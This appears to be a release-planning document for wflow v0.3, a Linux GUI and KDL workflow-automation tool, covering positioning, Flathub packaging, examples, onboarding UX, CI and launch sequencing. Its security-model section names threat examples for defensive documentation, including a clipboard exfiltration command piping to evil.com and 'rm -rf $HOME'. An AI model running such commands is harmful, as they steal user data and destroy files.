# wflow v0.3 — leg-2 positioning + public launch

Source: CEO review on 2026-04-25 (`/plan-ceo-review`, SELECTIVE EXPANSION mode).
Survived 3 rounds of adversarial spec review (5/10 → 8/10 → 9/10).

## Premise

Honest read of the three audience legs as of v0.2.0:

1. **AutoHotkey-on-Wayland** — DORMANT. Input plumbing exists (libei Record backend, KDL key-down/up/mouse-down/up) but no trigger-mode daemon, no hotkey-binding UX. Competitors (Hawck, keymapper) own this audience; wflow is not a contender today.
2. **macOS Shortcuts on Linux (GUI-first)** — ACTIVE. GUI editor with mutation shipped in v0.2; Library, save, run, Record. Competitor: CrossMacro (already on Flathub). Currently 80% feature-comparable.
3. **Declarative shell scripts (KDL-first)** — ACTIVE. KDL language complete with vars/flow/includes/imports/retries/timeouts; CLI runner; cron-friendly. No direct competitor. Currently 95% complete.

**Decision: leg 2 as the marketing headline.** Leg 3 stays functional (KDL is the substrate); leg 1 stays dormant. Positioning commitment, not a code-stripping commitment.

**Implication.** GUI must be polished, must ship on Flathub, must be the dominant install path. Comparison to CrossMacro is now unavoidable — wflow needs a *named* defensible dimension, not vibes. The strongest candidate: **workflows-as-files** — wflow workflows are version-controllable, diffable, hand-authorable, includable into other workflows, and shareable as plain text. CrossMacro stores workflows in a binary/proprietary format that can't be diffed or shared cleanly. That's the defensible angle. Secondary: declarative > record-replay (declarative survives UI changes; recordings break).

## Vision (12-month)

```
  CURRENT (v0.2.0)              v0.3 TARGET                12-MONTH IDEAL
  ────────────────              ───────────                ──────────────
  • All 3 legs at 50-95%       • Public repo               • One-sentence pitch lands
  • Repo private               • AUR + Flathub             • ≥100 GitHub stars
  • Zero non-Matt users        • One-sentence positioning  • At least one external
  • No clear positioning       • 5-7 example workflows      contributor PR merged
                               • Coalescing in Record       • Someone other than Matt
                                                            shared a workflow file
```

The single load-bearing metric is **non-Matt users**. Currently zero (repo private). Without crossing this threshold, distribution work is theatrical.

## Accepted scope (v0.3 cycle)

| # | Item | Effort | Notes |
|---|---|---|---|
| 1 | Make `cushycush/wflow` public | 5 min click + 2-3 sessions of pre-public prep | The flip itself is one Settings click. Comes *after* the pre-public deliverables. Once public, every commit and the README state are externally visible — much cheaper to land them while private. |
| 2 | Adopt positioning: *"Shortcuts for Linux — GUI + KDL workflow files"* | 30 min | README, GitHub social card, AUR description, future Flathub blurb all align. |
| 3 | Real AUR submission | ~half-day first time | SSH key registration, `.SRCINFO`, both repos cloned/pushed separately, ongoing comment-response burden. |
| 4 | `examples/` directory with 5-7 hand-authored workflows | 2hr | See "Example workflow specification" below. Onboarding hook for the README + GitHub repo browse. |
| 5 | Flathub package (gated on P0 spike) | 2-3 sessions | See "Flathub spike" below. Required to make leg-2 honest; CrossMacro is on Flathub. |
| 6 | Record-mode event coalescing (gated on Record soak) | 1-2 sessions | Spec algorithm first; gate on Record being demonstrably reliable across 5-10 manual recording sessions. |
| 7 | Security model — first-run confirmation prompt | 1 session | Mandatory: publication = strangers run other people's workflows. |
| 8 | CI pipeline | 1 session | Build + test on push, draft release on tag, PKGBUILD validation. |
| 9 | First-launch UX — welcome card + New-workflow dialog with templates + tutorial overlay | 2-3 sessions | See "First-launch UX" below. Added by `/plan-design-review` 2026-04-25 — the empty Library is the worst possible first impression for a leg-2 user; this section makes it not be that. |

## Deferred to TODOS

- **Trigger-mode daemon** for the AutoHotkey-on-Wayland audience. Distinct enough product surface that it's better tackled as v0.5+ if at all.
- **`wflow share` / Gist integration.** Premature; revisit after measurable adoption.
- **Per-step note field exposure** in GUI editor (Rust supports it, QML doesn't). Cosmetic.
- **Move/scroll multi-int and flow-control GUI editing.** Currently `wflow edit`-only. Long tail.

## NOT in scope

- Cutting any of the three audience legs (would need SCOPE REDUCTION mode).
- 10x cathedral expansion (would need EXPANSION mode).
- Re-architecting around triggers (would invalidate the leg-2 commitment).

## Flathub spike (P0 — must resolve before committing to manifest)

The load-bearing question: **wflow runs arbitrary shell commands. Flathub sandboxes by default forbid this.** Without a strategy, the GUI on Flathub becomes a workflow viewer that can't run workflows — leg-2 positioning is dead on arrival.

Three plausible strategies:

1. **`--talk-name=org.freedesktop.Flatpak` host-spawn permission.** wflow asks the host to run shell on its behalf via the Flatpak portal. Some apps do this (VSCode, Boxes). Pros: shell actions Just Work. Cons: review risk, prompt on first shell run.
2. **Bundle a minimal shell + utilities inside the sandbox.** Pros: clean review profile. Cons: workflows can't reach host PATH (no firefox, no system commands) — kills the use case.
3. **Document Flathub install as `--filesystem=host --talk-name=...` install-time permissions.** Honest-but-permissive. Pros: clearest contract with users. Cons: Flathub may reject as overly broad.

Plus parallel questions: how to package wdotool (host-installed prereq vs bundled vs bundled-but-disabled), Qt6 BaseApp version, freedesktop SDK version (24.08 likely), portal permissions list (RemoteDesktop for Record Mode, Notifications for `notify` action, SpiceClient for clipboard).

**Decision rule.** Run the spike in the first session of v0.3. If strategy 1 looks viable, proceed with Flathub commitment. If strategy 1 is rejected and strategy 3 is too permissive for review, **demote Flathub to a stretch goal** and commit to AUR-only distribution this cycle. The leg-2 positioning still works for Arch users; broader desktop-Linux distribution slips to v0.4.

## Example workflow specification

The 5-7 examples in `examples/` should be real, demonstrate KDL's full expressiveness, and each have a one-paragraph README explaining the use case. Initial list (final selection during v0.3):

1. **`dev-setup.kdl`** — open editor + dev terminal + browser tabs + tile windows for a project. Showcases shell + key + focus + delay.
2. **`screenshot-and-share.kdl`** — grim → wl-copy → notify. Showcases shell capture + clipboard + notify.
3. **`daily-standup.kdl`** — open Slack → focus channel → paste prepared message. Showcases imports/use for the message template.
4. **`loop-tab-thru.kdl`** — repeat block of `key "ctrl+tab"` N times to cycle through browser tabs. Showcases `repeat`.
5. **`if-vpn-then.kdl`** — `when env="VPN_ACTIVE"` block. Showcases conditional.
6. **`flaky-deploy-trigger.kdl`** — `shell "deploy.sh" retries=3 backoff="5s" timeout="2m"`. Showcases shell resilience features.
7. **`record-replay-export.kdl`** — example output from Record Mode showing what coalescing does. Showcases the recorder's actual output format.

Each example must work as-shipped — a CI job runs `wflow validate examples/*.kdl` on every commit.

## First-launch UX (added 2026-04-25 by /plan-design-review)

A leg-2 user clicks "install" on Flathub thinking *this is Shortcuts for Linux*. They open the app. What they see in the first 60 seconds determines whether they uninstall or keep it. Currently they see "No workflows yet" and a single Record CTA — that is a void. Three deliverables:

### 1. Welcome card (replaces empty `EmptyState` on first run)

Extend `EmptyState.qml` to take an optional secondary CTA + a small hero glyph slot, then bind it to a "first run" detection (presence of `~/.config/wflow/state.toml`). On true-empty state shown to a first-run user:

- **Title:** "Welcome to wflow"
- **Hero glyph:** a subtle wflow mark or 24px Theme.accent badge — not decorative blob territory.
- **Body:** "wflow runs sequences of keystrokes, clicks, shell commands, and waits. Record one with `● Record`, or pick a starting point from `+ New workflow`."
- **Primary CTA:** `+ New workflow` (mirrors the top bar; this becomes the dominant path for non-recording users)
- **Secondary CTA:** `● Record a workflow`

The empty state for a returning user (library was non-empty, now is empty by deletion) keeps the existing concise copy — only first-run gets the welcome.

### 2. New-workflow dialog (replaces immediate `Untitled` workflow creation)

When user clicks `+ New workflow`, open a modal dialog (~720px wide) with a `SegmentedControl` (already extracted) for three options:

- **Blank** — opens an empty `WorkflowPage`. First time only, an inline tutorial overlay anchors to the `+ Add step` footer in `SplitInspector` reading: *"Start by adding a step — try `Type text` or `Press key`."* Dismiss button (×). State persisted to `~/.config/wflow/state.toml` key `tutorials.blank_workflow_seen = true` so it never reappears. ARIA: `Accessible.role: ToolTip`, 4500ms auto-dismiss for screen-reader users.
- **From Template** — list of pre-installed example workflows (the 7 specified in "Example workflow specification" below). Each item shows title + one-line description + step count. Clicking a template copies it into `~/.config/wflow/workflows/` with a fresh UUID and opens the editor. Templates are read from `$XDG_DATA_DIRS/wflow/examples/` (AUR: `/usr/share/wflow/examples/`, Flathub: `/app/share/wflow/examples/`, cargo install: bundled via `include_str!` and copied to `~/.config/wflow/templates/` on first run).
- **Record** — closes dialog, navigates to Record page, triggers portal request.

### 3. State file

`~/.config/wflow/state.toml` becomes the single source of truth for UX onboarding state:
```toml
first_run_at = "2026-04-25T..."
[tutorials]
blank_workflow_seen = false
```
Created on first launch. Used by both the welcome-card detection and the tutorial-overlay dismissal.

### Implementation notes
- Build on existing `EmptyState`, `SegmentedControl`, `PrimaryButton`, `SecondaryButton` — do not invent new components.
- All copy must consume existing Theme tokens (font, color, spacing).
- Strict no-redesign: this is a UX gap fix, not a visual overhaul. Brand kit (Hanken Grotesk, oklch palette, amber accent, 8px radius) is unchanged.
- Tested at 880px window width: dialog sized fluidly (~min(720, parent-80)), welcome card uses existing `min(parent.width - 80, 440)` clamp.

### Out of scope for v0.3
- No multi-step onboarding tour. The tutorial overlay is one-and-done.
- No "import from CrossMacro" path. Defer until measurable demand.
- No template categories or search — flat list of 5-7 templates is fine for v0.3 volume.

## Security model — shareable + executable workflows

Threat: someone downloads `stranger.kdl`, runs `wflow run` on it, arbitrary shell executes. This is a footgun. v0.3 ships a minimal-but-real story:

1. **First-run prompt for untrusted workflows.** If a `.kdl` file wasn't created by `wflow new` on this machine, `wflow run` prints a summary of the shell commands it will execute and prompts confirmation. `--yes` flag overrides for cron use. GUI shows a "review steps" view by default.
   - **Fingerprint mechanism**: maintain `~/.config/wflow/trusted_workflows` — on `wflow new` and on user-confirmed `wflow run` of an untrusted file, append the file's absolute path + a SHA-256 of its content.
   - Re-prompt on content change (legitimate edits cost one extra confirmation; trade-off accepted).
   - Cloned-into-new-machine case re-prompts once, which is the desired behavior for "ran someone else's workflow."
2. **Reinforce existing safety tools.** `wflow show <path>` and `wflow run --explain` already exist. Reinforce in the README and first-run flow that `--explain` is the safety check.
3. **Don't add cryptographic signing yet** (premature). Just ensure the user has seen the commands before they run.
4. **Document attack vectors** in `REVIEW.md`: obvious (`rm -rf $HOME`), subtle (clipboard exfiltration via `wl-paste | curl evil.com -d @-`), social (workflow named "fix-firefox" that does something else).

## CI / release automation

Currently zero. Every release is hand-rolled. v0.3 adds:

1. **GitHub Actions: build + test on every push** (runs `cargo test`, `cargo build --release`).
2. **Release workflow on tag push** — builds the x86_64 tarball + computes sha256 + uploads to GitHub Release as draft. Removes the manual tarball-building done in v0.2.
3. **PKGBUILD validation in CI** — `bash -n` on both PKGBUILDs always; sha256-check is conditional. The release workflow (#2) produces the tarball before PKGBUILD validation runs, so the validation job depends on `release` and uses the just-built artifact, not a prior tag's tarball. On the *first* release post-public-flip, skip the sha256 step. All subsequent releases validate the wflow PKGBUILD's `sha256sums` against the tarball it points to.

## Open questions

1. **Flathub sandbox strategy** — resolved by the P0 spike (see above). Outcome determines whether Flathub is in v0.3 or slipped to v0.4.
2. **Success metric for "non-Matt users"** — **DECIDE BEFORE PUBLIC FLIP.** Default pick: count of distinct non-collaborator GitHub users who opened issues or PRs in the first 90 days post-flip. Stars are tracked but not load-bearing. Rationale: issue authors are the strongest "actually used it and hit something" signal short of telemetry, and the data is visible to anyone.
3. **wdotool packaging in Flathub** — the spike presupposes wdotool is host-installed. That's the default success path; bundling is fallback if reviewers reject the host-prereq model.
4. **Telemetry / phone-home** — **DEFERRED to v0.4 explicitly.** Rely on metric in #2. Revisit if issue volume after 90 days is too low to read signal from.

## Distribution / launch sequencing

Order matters. Don't bundle these into one push:

1. **Pre-public:** Flathub sandbox spike. Outcome determines whether Flathub stays in v0.3.
2. **Pre-public:** Security model — first-run confirmation prompt for unfamiliar workflows.
3. **Pre-public:** README rewrite + positioning + `examples/` directory (commit before flipping repo public).
4. **Pre-public:** CI pipeline (build + test on push).
5. **Pre-public (or fast-follow):** First-launch UX — welcome card + New dialog + tutorial overlay. Strongly preferred pre-public so the AUR/Flathub install path includes it; if v0.3 is running long, the welcome card alone (without the New dialog) is shippable as a smaller subset and the dialog can fast-follow as v0.3.1.
6. **Public flip** (single isolated change).
7. **AUR push** (same-day if the in-tree PKGBUILDs are clean; defer 1-2 days only if the public flip surfaces immediate issues).
8. **Release workflow on tag** (build + draft GitHub release automatically going forward).
9. **Coalescing** (independent feature work; can run in parallel with all distribution work).
10. **Flathub submission** (only if spike from #1 was viable; review cycle takes days/weeks).

**Cycle ambition note (added 2026-04-25):** v0.3 now has nine accepted items. Realistic budget is 4-6 sessions assuming Flathub spike succeeds and First-launch UX ships in full. If session budget is tighter, the documented partial-ship for #5 (welcome card alone) is the fallback. Coalescing (#9 in scope) and Flathub submission (#10) can also slip to v0.3.1 without breaking the leg-2 promise — both are "make it better" work, not "make it real" work.

## GSTACK REVIEW REPORT

| Review | Trigger | Why | Runs | Status | Findings |
|--------|---------|-----|------|--------|----------|
| CEO Review | `/plan-ceo-review` | Scope & strategy | 1 | CLEAR | 8 proposals, 6 accepted, 2 deferred (mode: SELECTIVE_EXPANSION) |
| Codex Review | `/codex review` | Independent 2nd opinion | 0 | — | — |
| Eng Review | `/plan-eng-review` | Architecture & tests (required) | 0 | — | — |
| Design Review | `/plan-design-review` | UI/UX gaps | 1 | CLEAR | score: 5/10 → 8/10, 3 decisions added (welcome card, New dialog with templates, blank-workflow tutorial overlay) |
| DX Review | `/plan-devex-review` | Developer experience gaps | 0 | — | — |

- **UNRESOLVED:** 0
- **VERDICT:** CEO + DESIGN CLEARED — eng review required before implementation begins.
